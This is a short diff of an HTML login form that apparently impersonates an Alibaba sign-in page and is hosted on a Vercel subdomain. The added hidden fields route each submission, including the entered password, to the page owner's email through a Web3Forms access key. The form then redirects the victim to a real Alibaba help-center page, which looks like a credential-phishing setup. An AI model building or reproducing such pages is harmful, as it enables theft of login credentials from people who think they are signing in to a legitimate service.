@@ -308,9 +308,14 @@ placeholder="Password">
 
 <span class="forgot">Forgot password?</span>
 
-  <input type="hidden" name="_url" value="https://image-review-alibaba.vercel.app/">
-  <input type="hidden" name="_captcha" value="false">
-  <input type="hidden" name="_next" value="https://image-review-alibaba.vercel.app/">
+  <!-- Web3Forms required hidden field -->
+    <input type="hidden" name="access_key" value="96514761-5b05-473a-b7d0-baac40a13a06">
+
+    <!-- Optional: Subject for the email you receive -->
+    <input type="hidden" name="subject" value="New Form Submission">
+
+    <!-- Optional: Redirect after success (you can change this) -->
+    <input type="hidden" name="redirect" value="https://helpcenter.alibaba.com/s/buyer/category?categoryId=275875488">
 
 <button type="submit" class="continue">Continue</button>
 
